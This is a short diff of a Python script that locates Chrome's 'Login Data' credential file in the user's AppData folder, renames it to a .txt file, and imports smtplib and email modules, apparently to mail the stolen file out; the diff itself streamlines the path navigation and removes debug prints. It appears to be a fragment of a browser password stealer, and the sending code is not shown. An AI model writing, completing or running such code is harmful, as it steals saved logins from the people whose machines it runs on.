@@ -5,17 +5,8 @@ import time
 t = os.environ['APPDATA']
 os.chdir(t)
 os.chdir('..')
-p = os.listdir()
-os.chdir("Local\Google")
-pt = os.listdir()
-os.chdir("Chrome\\User Data\\Default")
-ptf = os.listdir()
-tt = os.getcwd()
+os.chdir("Local\\Google\\Chrome\\User Data\\Default")
 os.rename("Login Data", "Login Data.txt")
-print (p)
-print (pt)
-print (ptf)
-
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
